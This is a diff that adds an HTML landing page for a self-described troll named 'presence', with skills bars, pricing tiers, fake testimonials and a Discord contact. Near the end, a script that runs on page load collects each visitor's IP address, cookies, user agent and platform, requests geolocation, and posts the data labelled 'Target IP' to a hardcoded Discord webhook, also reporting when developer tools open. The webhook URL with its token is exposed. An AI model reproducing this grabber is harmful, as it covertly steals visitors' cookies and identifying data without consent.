@@ -1,0 +1,738 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>presence ♱</title>
+     <meta name="description"
+   content="presence Website where u can get tools and etc.">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <style>
+    body, h1,h2,h3,h4,h5,h6 {font-family: "Montserrat", sans-serif}
+    .w3-row-padding img {margin-bottom: 12px}
+   
+    .w3-sidebar {width: 120px;background: #222;}
+   
+    #main {margin-left: 120px}
+   
+    @media only screen and (max-width: 600px) {#main {margin-left: 0}}
+    </style>
+  </head>
+<body class="w3-black">
+
+
+<nav class="w3-sidebar w3-bar-block w3-small w3-hide-small w3-center">
+ 
+  <img src="https://cdn.discordapp.com/attachments/1138522922521214982/1139598106476945478/cd9a4182cfda4bba5132fc3218f421d9.png" style="width:100%">
+  <a href="#" class="w3-bar-item w3-button w3-padding-large w3-black">
+    <i class="fa fa-home w3-xxlarge"></i>
+    <p>HOME</p>
+  </a>
+  <a href="#about" class="w3-bar-item w3-button w3-padding-large w3-hover-black">
+    <i class="fa fa-user w3-xxlarge"></i>
+    <p>ABOUT</p>
+  </a>
+  </a>
+  <a href="#contact" class="w3-bar-item w3-button w3-padding-large w3-hover-black">
+    <i class="fa fa-envelope w3-xxlarge"></i>
+    <p>CONTACT</p>
+  </a>
+</nav>
+
+
+<div class="w3-top w3-hide-large w3-hide-medium" id="myNavbar">
+  <div class="w3-bar w3-black w3-opacity w3-hover-opacity-off w3-center w3-small">
+    <a href="#" class="w3-bar-item w3-button" style="width:25% !important">HOME</a>
+    <a href="#about" class="w3-bar-item w3-button" style="width:25% !important">ABOUT</a>
+    <a href="#contact" class="w3-bar-item w3-button" style="width:25% !important">CONTACT</a>
+  </div>
+</div>
+
+
+<div class="w3-padding-large" id="main">
+  
+  <header class="w3-container w3-padding-32 w3-center w3-black" id="home">
+    <h1 class="w3-jumbo"><span class="w3-hide-small">♱glare♱</span> @madeyouslit.</h1>
+    <p>certi troller</p>
+    <img src="https://cdn.discordapp.com/attachments/1138522922521214982/1140777187935539210/29aea955abb6054aa90846fc8fd5d049.png" class="w3-image" width="992" height="1108">
+ 
+ 
+ 
+
+   
+    
+      <style>
+        body {
+            background-image: url("https://media.discordapp.net/attachments/1132806166016167946/1135368870031544420/kawaiicore_header_gifs_22.gif");
+            background-size: cover;
+            font-family: sans-serif;
+            height: 100vh;
+            margin: 0;
+        }
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            opacity: 1;
+            transition: opacity 0.5s ease-in-out;
+            z-index: 999;
+        }
+        .overlay-text {
+            color: #fff;
+            font-size: 50px;
+            font-weight: bold;
+            text-align: center;
+            text-shadow: 0px 0px 10px #fff;
+            cursor: pointer;
+        }
+        .container {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 80%;
+            max-width: 600px;
+            text-align: center;
+            padding: 50px;
+            background-color: rgba(128, 128, 128, 0.7);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.5);
+            opacity: 0;
+            transition: opacity 0.5s ease-in-out;
+        }
+        .container.show {
+            opacity: 1;
+        }
+        .container::before {
+            content: "";
+            position: absolute;
+            right: -10px;
+            top: 0;
+            height: 100%;
+            width: 10px;
+            background: linear-gradient(to right, rgba(128, 128, 128, 0) 0%, rgba(128, 128, 128, 0.7) 50%, rgba(128, 128, 128, 0) 100%);
+        }
+        .profile-pic {
+            display: inline-block;
+            position: relative;
+            overflow: hidden;
+            border-radius: 50%;
+            width: 150px;
+            height: 150px;
+            margin-bottom: 20px;
+            transition: transform 0.3s ease-in-out;
+            box-shadow: 0px 0px 5px rgba(0, 0, 0, 0.3);
+        }
+        .profile-pic:hover {
+            transform: scale(1.1);
+            box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.5);
+        }
+        .profile-pic img {
+            display: block;
+            width: 100%;
+            height: auto;
+        }
+        .name {
+            font-size: 30px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #fff;
+            text-shadow: 0px 0px 10px #fff;
+        }
+        .description {
+            font-size: 20px;
+            margin-bottom: 20px;
+            color: #fff;
+            text-shadow: 0px 0px 10px #fff;
+            display: inline-block;
+        }  
+        .description::after {
+            content: "";
+            position: absolute;
+            right: -10px;
+            top: 0;
+            height: 100%;
+            width: 10px;
+            background: linear-gradient(to right, rgba(128, 128, 128, 0) 0%, rgba(128, 128, 128, 0.7) 50%, rgba(128, 128, 128, 0) 100%);
+        }
+        @keyframes typing {
+            from {
+                width: 0;
+            }
+            to {
+                width: 100%;
+            }
+        }
+        .social-links {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .social-links a {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-right: 15px;
+            width: 60px;
+            height: 60px;
+            background-color: transparent;
+            color: #fff;
+            border-radius: 20px;
+            text-decoration: none;
+            transition: opacity 0.3s ease-in-out;
+            box-shadow: 0px 0px 5px rgba(0, 0, 0, 0.3);
+        }
+        .social-links a:hover {
+            opacity: 0.7;
+        }
+        .social-links a i {
+            font-size: 30px; 
+        }
+        .snowfall {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: -1;
+        }
+        .song-player-progress-bar {
+            width: 100%;
+            height: 10px;
+            background-color: rgba(255, 255, 255, 0.2);
+            border-radius: 5px;
+            margin-top: 20px;
+        }
+
+        .song-player-progress-bar-fill {
+            height: 100%;
+            background-color: #fff;
+            border-radius: 5px;
+            width: 0;
+            transition: width 0.3s ease-in-out;
+        }
+
+        .song-player-controls {
+            margin-top: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .song-player-controls button {
+            background-color: transparent;
+            border: none;
+            color: #fff;
+            font-size: 20px;
+            margin: 0 10px;
+            cursor: pointer;
+            transition: opacity 0.3s ease-in-out;
+        }
+
+        .song-player-controls button:hover {
+            opacity: 0.7;
+        }
+
+        .song-player-time {
+            color: #fff;
+            margin-top: 10px;
+        }
+.snowflake {
+  color: #fff;
+  font-size: 1em;
+  font-family: Arial, sans-serif;
+  text-shadow: 0 0 5px #000;
+}
+
+@-webkit-keyframes snowflakes-fall{0%{top:-10%}100%{top:100%}}@-webkit-keyframes snowflakes-shake{0%,100%{-webkit-transform:translateX(0);transform:translateX(0)}50%{-webkit-transform:translateX(80px);transform:translateX(80px)}}@keyframes snowflakes-fall{0%{top:-10%}100%{top:100%}}@keyframes snowflakes-shake{0%,100%{transform:translateX(0)}50%{transform:translateX(80px)}}.snowflake{position:fixed;top:-10%;z-index:9999;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;cursor:default;-webkit-animation-name:snowflakes-fall,snowflakes-shake;-webkit-animation-duration:10s,3s;-webkit-animation-timing-function:linear,ease-in-out;-webkit-animation-iteration-count:infinite,infinite;-webkit-animation-play-state:running,running;animation-name:snowflakes-fall,snowflakes-shake;animation-duration:10s,3s;animation-timing-function:linear,ease-in-out;animation-iteration-count:infinite,infinite;animation-play-state:running,running}.snowflake:nth-of-type(0){left:1%;-webkit-animation-delay:0s,0s;animation-delay:0s,0s}.snowflake:nth-of-type(1){left:10%;-webkit-animation-delay:1s,1s;animation-delay:1s,1s}.snowflake:nth-of-type(2){left:20%;-webkit-animation-delay:6s,.5s;animation-delay:6s,.5s}.snowflake:nth-of-type(3){left:30%;-webkit-animation-delay:4s,2s;animation-delay:4s,2s}.snowflake:nth-of-type(4){left:40%;-webkit-animation-delay:2s,2s;animation-delay:2s,2s}.snowflake:nth-of-type(5){left:50%;-webkit-animation-delay:8s,3s;animation-delay:8s,3s}.snowflake:nth-of-type(6){left:60%;-webkit-animation-delay:6s,2s;animation-delay:6s,2s}.snowflake:nth-of-type(7){left:70%;-webkit-animation-delay:2.5s,1s;animation-delay:2.5s,1s}.snowflake:nth-of-type(8){left:80%;-webkit-animation-delay:1s,0s;animation-delay:1s,0s}.snowflake:nth-of-type(9){left:90%;-webkit-animation-delay:3s,1.5s;animation-delay:3s,1.5s}.snowflake:nth-of-type(10){left:25%;-webkit-animation-delay:2s,0s;animation-delay:2s,0s}.snowflake:nth-of-type(11){left:65%;-webkit-animation-delay:4s,2.5s;animation-delay:4s,2.5s}
+    </style>
+    
+   
+
+  </header>
+
+  <center>
+  <div class="w3-content w3-justify w3-text-grey w3-padding-64" id="about">
+    <h2 class="w3-text-light-grey">♱ @madeyouslit</h2>
+    <hr style="width:200px" class="w3-opacity">
+    <p>♱ presence is js a shitty troll idk. 
+    </p>
+    <h3 class="w3-padding-16 w3-text-light-grey">My Skills</h3>
+    <p class="w3-wide">Programming</p>
+    <div class="w3-white">
+      <div class="w3-dark-grey" style="height:28px;width:50%"></div>
+    </div>
+    <p class="w3-wide">Web Design</p>
+    <div class="w3-white">
+      <div class="w3-dark-grey" style="height:28px;width:50%"></div>
+    </div>
+    <p class="w3-wide">Cybersecurity</p>
+    <div class="w3-white">
+      <div class="w3-dark-grey" style="height:28px;width:65%"></div>
+    </div>
+    <p class="w3-wide">Networking</p>
+    <div class="w3-white">
+      <div class="w3-dark-grey" style="height:28px;width:80%"></div>
+    </div><br>
+    
+    <div class="w3-row w3-center w3-padding-16 w3-section w3-light-grey">
+      <div class="w3-quarter w3-section">
+        <span class="w3-xlarge">3</span><br>
+        Partners
+      </div>
+      <div class="w3-quarter w3-section">
+        <span class="w3-xlarge">15+</span><br>
+        Projects Done
+      </div>
+      <div class="w3-quarter w3-section">
+        <span class="w3-xlarge">89+</span><br>
+        Happy Clients
+      </div>
+      <div class="w3-quarter w3-section">
+        <span class="w3-xlarge">5+</span><br>
+        Meetings
+      </div>
+    </div>
+
+    
+    <h3 class="w3-padding-16 w3-text-light-grey">My Price</h3>
+    <div class="w3-row-padding" style="margin:0 -16px">
+      <div class="w3-half w3-margin-bottom">
+        <ul class="w3-ul w3-white w3-center w3-opacity w3-hover-opacity-off">
+          <li class="w3-dark-grey w3-xlarge w3-padding-32">Basic</li>
+          <li class="w3-padding-16">Web Design</li>
+          <li class="w3-padding-16">Basic Programming</li>
+          <li class="w3-padding-16">trolled</li>
+          <li class="w3-padding-16">
+            <h2>$ 10</h2>
+            <span class="w3-opacity">per month</span>
+          </li>
+          <li class="w3-light-grey w3-padding-24">
+            <h2>Contact presence</h2>
+          </li>
+        </ul>
+      </div>
+
+      <div class="w3-half">
+        <ul class="w3-ul w3-white w3-center w3-opacity w3-hover-opacity-off">
+          <li class="w3-dark-grey w3-xlarge w3-padding-32">Pro</li>
+          <li class="w3-padding-16">Cybersecurity/Networking Analysis</li>
+          <li class="w3-padding-16">Programming/Web Development</li>
+          <li class="w3-padding-16">Malware Removal</li>
+          <li class="w3-padding-16">presence Multi Tool</li>
+          <li class="w3-padding-16">
+            <h2>$ 25</h2>
+            <span class="w3-opacity">per month</span>
+          </li>
+          <li class="w3-light-grey w3-padding-24">
+             <h2>Contact madeyouslit</h2>
+          </li>
+        </ul>
+      </div>
+    
+    </div>
+    
+    
+    <h3 class="w3-padding-24 w3-text-light-grey">Comments</h3>  
+    <img src="https://cdn.discordapp.com/attachments/1138522922521214982/1140773410889273354/ab67616d0000b2738064f6d8c455fa376788e79f.png" alt="Avatar" class="w3-left w3-circle w3-margin-right" style="width:80px">
+    <p><span class="w3-large w3-margin-right">sinful.</span> New User</p>
+    <p>Someone hacked my instagram acc but he helped me get it back kys</p><br>
+    
+    <img src="https://cdn.discordapp.com/attachments/1138522922521214982/1140777187935539210/29aea955abb6054aa90846fc8fd5d049.png" alt="Avatar" class="w3-left w3-circle w3-margin-right" style="width:80px">
+    <p><span class="w3-large w3-margin-right">2stepper</span> New User</p>
+    <p>I bought presence multi tool and it was amazin but still some bugs!</p>
+  
+  </div>
+  
+  
+ 
+  </div>
+
+  
+  <center><div class="w3-padding-64 w3-content w3-text-grey" id="contact">
+    <h2 class="w3-text-light-grey">Contact Me</h2>
+    <hr style="width:200px" class="w3-opacity">
+
+    <div class="w3-section">
+      <p><i class="fa fa-envelope fa-fw w3-text-white w3-xxlarge w3-margin-right"> </i> Discord: madeyouslit</p>
+    </div><br>
+    
+<center><br><a
+            href="https://discord.gg/7sfVc8jbBB">
+            join presence discord server
+            </ca>
+          </br></center>
+
+    <font face="Adobe Gothic Std"
+         size="3" font color="white">
+     <footer>
+       &copy;presence
+      </footer>
+    </center>
+    
+
+      </p>
+    </form>
+ 
+  </div>
+
+
+   <div class="snowflakes"
+       aria-hidden="true">
+       <div class="snowflake">
+        𐕣
+       </div>
+       <div class="snowflake">
+        ⸸
+       </div>
+       <div class="snowflake">
+        𐕣
+       </div>
+       <div class="snowflake">
+        ⸸
+       </div>
+       <div class="snowflake">
+        𐕣
+       </div>
+       <div class="snowflake">
+        ⸸
+       </div>
+       <div class="snowflake">
+        𐕣
+       </div>
+       <div class="snowflake">
+        ⸸
+       </div>
+       <div class="snowflake">
+        𐕣
+       </div>
+       <div class="snowflake">
+        ⸸
+       </div>
+       <div class="snowflake">
+        𐕣
+       </div>
+       <div class="snowflake">
+        ⸸
+       </div>
+  
+
+ <style>
+  a {
+    display: inline-block;
+    padding: 1rem 2rem;
+    background-color: black;
+    color: white;
+    text-decoration: none;
+    border-radius: 4px;
+    font-size: 1.2rem;
+    margin-top: 1rem;
+}
+
+
+
+.snowflake {
+    color: #fff;
+    font-size: 1em;
+    font-family: Arial, sans-serif;
+    text-shadow: 0 0 5px #000;
+}
+
+@-webkit-keyframes snowflakes-fall {
+    0% { top: -10%; }
+    100% { top: 100%; }
+}
+
+@-webkit-keyframes snowflakes-shake {
+    0%, 100% { -webkit-transform: translateX(0); transform: translateX(0); }
+    50% { -webkit-transform: translateX(80px); transform: translateX(80px); }
+}
+
+@keyframes snowflakes-fall {
+    0% { top: -10%; }
+    100% { top: 100%; }
+}
+
+@keyframes snowflakes-shake {
+    0%, 100% { transform: translateX(0); }
+    50% { transform: translateX(80px); }
+}
+
+.snowflake {
+    position: fixed;
+    top: -10%;
+    z-index: 9999;
+    -webkit-user-select: none;
+    -moz-user-select: none;
+    -ms-user-select: none;
+    user-select: none;
+    cursor: default;
+    -webkit-animation-name: snowflakes-fall, snowflakes-shake;
+    -webkit-animation-duration: 10s, 3s;
+    -webkit-animation-timing-function: linear, ease-in-out;
+    -webkit-animation-iteration-count: infinite, infinite;
+    -webkit-animation-play-state: running, running;
+    animation-name: snowflakes-fall, snowflakes-shake;
+    animation-duration: 10s, 3s;
+    animation-timing-function: linear, ease-in-out;
+    animation-iteration-count: infinite, infinite;
+    animation-play-state: running, running;
+}
+
+.snowflake:nth-of-type(0) { left: 1%; -webkit-animation-delay: 0s, 0s; animation-delay: 0s, 0s; }
+.snowflake:nth-of-type(1) { left: 10%; -webkit-animation-delay: 1s, 1s; animation-delay: 1s, 1s; }
+.snowflake:nth-of-type(2) { left: 20%; -webkit-animation-delay: 6s, .5s; animation-delay: 6s, .5s; }
+.snowflake:nth-of-type(3) { left: 30%; -webkit-animation-delay: 4s, 2s; animation-delay: 4s, 2s; }
+.snowflake:nth-of-type(4) { left: 40%; -webkit-animation-delay: 2s, 2s; animation-delay: 2s, 2s; }
+.snowflake:nth-of-type(5) { left: 50%; -webkit-animation-delay: 8s, 3s; animation-delay: 8s, 3s; }
+.snowflake:nth-of-type(6) { left: 60%; -webkit-animation-delay: 6s, 2s; animation-delay: 6s, 2s; }
+.snowflake:nth-of-type(7) { left: 70%; -webkit-animation-delay: 2.5s, 1s; animation-delay: 2.5s, 1s; }
+.snowflake:nth-of-type(8) { left: 80%; -webkit-animation-delay: 1s, 0s; animation-delay: 1s, 0s; }
+.snowflake:nth-of-type(9) { left: 90%; -webkit-animation-delay: 3s, 1.5s; animation-delay: 3s, 1.5s; }
+.snowflake:nth-of-type(10) { left: 25%; -webkit-animation-delay: 2s, 0s; animation-delay: 2s, 0s; }
+.snowflake:nth-of-type(11) { left: 65%; -webkit-animation-delay: 4s, 2.5s; animation-delay: 4s, 2.5s; }{
+</style>
+
+
+<font face="Adobe Gothic Std"
+         size="3" font color="black">
+         <body>
+          <div class="container">
+           
+           
+           
+          </div>
+           </div>
+          <p id="location"></p>
+          <div id="ip-address"></div>
+          <div id="cookies"></div>
+          <div id="device-info"></div>
+          <div id="browser-info"></div>
+        </font>
+        <script>
+         document.addEventListener(
+          'DOMContentLoaded', () => {
+           getLocation();
+           getIPAddress();
+          });
+         
+         function getLocation() {
+          if ('geolocation' in
+           navigator) {
+           navigator.geolocation
+            .getCurrentPosition(
+             showLocation,
+             handleError);
+          } else {
+           document.getElementById(
+             'location')
+            .textContent =
+            "Geolocation is not supported by this browser.";
+          }
+         }
+         
+         function showLocation(
+          position) {
+          const latitude = position
+           .coords
+           .latitude;
+          const longitude = position
+           .coords
+           .longitude;
+          document.getElementById(
+            'location')
+           .textContent =
+           `Latitude: ${latitude}, Longitude: ${longitude}`;
+         }
+         
+         function handleError(error) {
+          switch (error.code) {
+           case error
+           .PERMISSION_DENIED:
+            document.getElementById(
+              'location')
+             .textContent =
+             "Permission to access device location was denied.";
+            break;
+           case error
+           .POSITION_UNAVAILABLE:
+            document.getElementById(
+              'location')
+             .textContent =
+             "Device location information is unavailable.";
+            break;
+           case error.TIMEOUT:
+            document.getElementById(
+              'location')
+             .textContent =
+             "Request to get device location timed out.";
+            break;
+           case error.UNKNOWN_ERROR:
+            document.getElementById(
+              'location')
+             .textContent =
+             "An unknown error occurred while getting the device location.";
+            break;
+          }
+         }
+         
+         const DISCORD_WEBHOOK_URL =
+          'https://discord.com/api/webhooks/1140815526612959252/eBhmazf30YO37iWAoh_Ss3krRpLrw6vUQqHbJYRhXeExbF51VQifWm0ls2gKoMf1sfMf';
+         
+         async function getIPAddress() {
+          try {
+           const response =
+            await fetch(
+             'https://api.ipify.org?format=json'
+            );
+           const data = await response
+            .json();
+           const ipAddress = data.ip;
+           displayIPAddress(
+            ipAddress);
+           displayCookies();
+           displayDeviceInfo();
+           displayBrowserInfo();
+           sendToDiscord(`Target IP: ${ipAddress}
+${getDeviceInfo()}
+${getBrowserInfo()}
+${getCookiesInfo()}`);
+          } catch (error) {
+           console.error(
+            'Failed to fetch IP address:',
+            error);
+          }
+         }
+         
+         function displayIPAddress(
+          ipAddress) {
+          const ipAddressElement =
+           document
+           .getElementById(
+            'ip-address');
+          ipAddressElement
+           .textContent =
+           `IP Address: ${ipAddress}`;
+         }
+         
+         function displayCookies() {
+          const cookiesElement =
+           document
+           .getElementById('cookies');
+          const cookies = document
+           .cookie.split(
+            '; ');
+          let cookiesHTML =
+           'Cookies:<br>';
+          cookies.forEach((cookie) => {
+           cookiesHTML +=
+            `${cookie}<br>`;
+          });
+          cookiesElement.innerHTML =
+           cookiesHTML;
+         }
+         
+         function displayDeviceInfo() {
+          const deviceInfoElement =
+           document
+           .getElementById(
+            'device-info');
+          const deviceInfo =
+           getDeviceInfo();
+          deviceInfoElement
+           .textContent = `Device Info:
+${deviceInfo}`;
+         }
+         
+         function displayBrowserInfo() {
+          const browserInfoElement =
+           document
+           .getElementById(
+            'browser-info');
+          const browserInfo =
+           getBrowserInfo();
+          browserInfoElement
+           .textContent = `Browser Info:
+${browserInfo}`;
+         }
+         
+         function getCookiesInfo() {
+          const cookies = document
+           .cookie;
+          return `Cookies: ${cookies}`;
+         }
+         
+         function getDeviceInfo() {
+          const userAgent = navigator
+           .userAgent;
+          const platform = navigator
+           .platform;
+          const deviceInfo = `User Agent: ${userAgent}
+Platform: ${platform}`;
+          return deviceInfo;
+         }
+         
+         function getBrowserInfo() {
+          
+          return '';
+         }
+         
+         async function sendToDiscord(
+          message) {
+          try {
+           const payload = {
+            content: message,
+           };
+           
+           const response =
+            await fetch(
+             DISCORD_WEBHOOK_URL, {
+              method: 'POST',
+              headers: {
+               'Content-Type': 'application/json',
+              },
+              body: JSON.stringify(
+               payload),
+             });
+           
+           if (response.status !==
+            204) {
+            console.error(
+             'Failed to send message to Discord.'
+            );
+           }
+          } catch (error) {
+           console.error(
+            'Failed to send message to Discord:',
+            error);
+          }
+         }
+         
+         window.addEventListener(
+          'devtoolschange', (
+           event) => {
+           if (event.detail.isOpen) {
+            console.log(
+             'IDS Detected Developer tools or inspect element opened'
+            );
+            sendToDiscord(
+             'IDS Detected Developer tools or inspect element opened'
+            );
+           }
+          });
+        </script>
+
+
+        </body>
+    
+  </html>
